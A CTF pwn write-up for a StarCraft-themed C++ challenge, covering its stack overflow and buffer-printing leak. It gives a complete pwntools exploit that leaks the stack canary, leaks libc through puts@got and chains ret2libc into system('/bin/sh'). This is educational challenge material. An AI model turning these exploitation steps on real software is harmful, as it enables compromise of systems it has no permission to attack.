# CPP (SCV Good To Go, Sir) — Pwn Writeup
## Author : afk-Yato (facelesspwner)

## Overview

| | |
|---|---|
| **Challenge** | "SCV GOOD TO GO, SIR" — StarCraft-themed C++ pwn (binary `svc`/`chall`) |
| **Category** | Pwn / Stack overflow + ROP |
| **Binary** | `chall` — ELF 64-bit, **no PIE**, **stripped**, links `libstdc++` |
| **Libc** | **Debian glibc 2.42** (bundled `libc.so.6` + custom `ld-linux-x86-64.so.2`) |
| **Flag** | local `flag.txt` is a placeholder (`NSC{}`); real flag on the remote |

```
$ checksec chall
    PIE      : NO
    RELRO    : PARTIAL
    NX       : ENABLED
    Canary   : YES
```

The Dockerfile ships the binary with its **own glibc 2.42 loader** (`run.sh`: `setpriv --reuid=2000 ... ld-linux-x86-64.so.2 --library-path /home/ctf /home/ctf/svc` behind socat), so the system glibc never matters — all offsets come from the bundled `libc.so.6`.

## The Program

A stripped C++ binary; `main` is found via the `__libc_start_main` argument at `0x4009bd` → **`main = 0x400a96`**. The menu:

```
-------------------------
[*]SCV GOOD TO GO,SIR....
1.FEED SCV....
2.REVIEW THE FOOD....
3.MINE MINERALS....
```

Reversing `main`:

* **1 — FEED SCV**: `read(0, buf, 0xf8)` where `buf` is at **`rbp-0xb0`** (176 bytes). Return value stored in a local (`DO NOT HURT MY SCV` is just the error path string).
* **2 — REVIEW THE FOOD**: `puts(buf)` — a free **stack leak** of whatever we fed it.
* **3 — MINE MINERALS**: sets the loop flag false → `main` returns → ROP fires.

There is also a static `std::ios_base::Init` object (hence "cpp" challenge name) — irrelevant except it pulls in the C++ runtime.

### Stack layout

```
rbp-0xb0  buf[176]        (0xb0 = 176)
rbp-0x08  canary          -> offset from buf: 176 - 8 = 168
rbp+0x00  saved rbp       -> 176
rbp+0x08  return address  -> 184
```

`read` allows `0xf8 = 248` bytes, i.e. we can write 248-168 = **80 bytes past the canary start** — enough for canary + rbp + a solid ROP chain.

## The Bugs

1. **Stack overflow** — `read(0, buf, 0xf8)` into a 176-byte buffer.
2. **Info leak** — `puts(buf)` prints the buffer up to its first NUL byte.

With no PIE and partial RELRO, the binary's PLT/GOT are at fixed addresses:

```
pop rdi ; ret          = 0x400ea3        (gadget in __libc_csu_init)
ret                    = 0x4008b1        (alignment)
puts@got               = 0x602018
puts@plt               = 0x4008d0
main                   = 0x400a96
```

## Exploit Strategy

### Stage 0 — leak the canary

The canary's least significant byte is `\x00`. Feed exactly **168 bytes** (`A*160 + B*8`) and let `sendline`'s trailing `\n` **overwrite the canary's null byte** with `0x0a`:

```python
payload = b"A"*8*20 + b"B"*8      # 168 bytes; '\n' from sendline lands on canary[0]
feed(payload)
review()                          # puts(buf) prints: A's, B's, then the 7 canary bytes
p.recvuntil(b"B"*8 + b"\n")       # hmm: the 0x0a we wrote is printed as the newline
canary = u64(b"\x00" + p.recv(7)) # canary = 00 || leaked 7 bytes
```

`puts` now runs through the B's and the 7 remaining canary bytes (no NUL until canary byte 7... byte 0 is the one we clobbered) — we read them back and restore the `\x00` ourselves.

### Stage 1 — ROP: leak libc via puts(puts@got), return to main

```python
payload  = b"X"*168            # padding
payload += p64(canary)         # good canary
payload += p64(0xdeadbeef)     # saved rbp (junk)
payload += p64(pop_rdi)        # 0x400ea3
payload += p64(puts_got)       # 0x602018
payload += p64(puts_plt)       # 0x4008d0  -> puts(puts@got) = leak
payload += p64(main)           # 0x400a96  -> restart the menu for stage 2
feed(payload); leave()         # option 3: main returns into our chain
```

### Stage 2 — compute libc and pop a shell

Offsets **verified against the bundled Debian glibc 2.42**:

```
puts   = libc + 0x82060
system = libc + 0x54790
"/bin/sh" = libc + 0x1aaea4
```

```python
libc_base = puts_leak - 0x82060
payload  = b"0"*168
payload += p64(canary)
payload += b"0"*8              # saved rbp
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(0x4008b1)       # ret — 16-byte alignment for system()
payload += p64(system)
feed(payload); leave()
```

The extra `ret` gadget keeps `rsp` 16-byte aligned inside `system` (glibc 2.42 uses SSE instructions that fault on misalignment — the classic `movaps` crash).

## Final Exploit

```python
from pwn import *
context.arch = 'amd64'
context.log_level = 'info'

p = process(["./ld-linux-x86-64.so.2", "--library-path", ".", "./chall"])
# remote on the real service

elf = ELF('./chall', checksec=False)

pop_rdi   = 0x400ea3
ret       = 0x4008b1
puts_got  = 0x602018
puts_plt  = 0x4008d0
main      = 0x400a96

def feed(data):
    p.recvuntil(b">>"); p.sendline(b"1")
    p.recvuntil(b">>"); p.sendline(data)

def review():
    p.recvuntil(b">>"); p.sendline(b"2")

def leave():
    p.recvuntil(b">>"); p.sendline(b"3")

# ---- canary leak ----
feed(b"A"*160 + b"B"*8)
review()
p.recvuntil(b"B"*8 + b"\n")
canary = u64(b"\x00" + p.recv(7))
log.success(f"canary  : {hex(canary)}")

# ---- libc leak ----
payload  = b"A"*168 + p64(canary) + b"B"*8
payload += p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)
feed(payload)
leave()
p.recvline()
leak = u64(p.recvline().strip().ljust(8, b"\x00"))
libc_base = leak - 0x82060
system    = libc_base + 0x54790
binsh     = libc_base + 0x1aaea4
log.success(f"libc    : {hex(libc_base)}")

# ---- shell ----
payload  = b"A"*168 + p64(canary) + b"B"*8
payload += p64(pop_rdi) + p64(binsh) + p64(ret) + p64(system)
feed(payload)
leave()

p.interactive()
```

## Notes / Takeaways

* Textbook **canary-leak → ret2libc** on a no-PIE binary. The two program "features" (feed + review) are all you need: one writes past the canary, the other prints it back.
* The `\n`-overwrites-canary-LSB trick: `sendline` converts the canary's terminator null into a printable byte, letting `puts` run 7 bytes further. Restore the `\x00` on your side.
* Returning to `main` (not `_start`!) after the leak keeps the C++ runtime intact and re-arms the menu for the second stage.
* Always use the **bundled** libc for offsets — this challenge pairs an old-school static-looking binary with a bleeding-edge glibc 2.42, and system-database offsets would be completely wrong (`puts 0x82060`, `system 0x54790`, `/bin/sh 0x1aaea4`).
* The single `ret` gadget before `system` fixes stack alignment — on modern glibc, `system` crashes with `SIGSEGV` in `movaps` without it.
